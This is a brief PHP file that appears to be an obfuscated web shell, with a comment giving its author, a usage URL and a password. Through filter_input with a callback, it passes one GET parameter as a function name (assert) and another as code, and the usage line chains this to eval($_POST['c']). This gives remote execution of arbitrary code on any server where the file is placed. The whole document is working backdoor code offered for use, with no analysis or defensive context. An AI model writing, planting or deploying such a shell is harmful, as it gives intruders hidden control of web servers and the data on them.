<?php
/*
 * Author : WangYihang
 * Usage : http://127.0.0.1/index.php?&c=assert&d=eval($_POST['c'])
 * Password : c
 */
function a($c){$c($_GET['d']);}filter_input(INPUT_GET,'c', FILTER_CALLBACK,array('options'=>'a'));
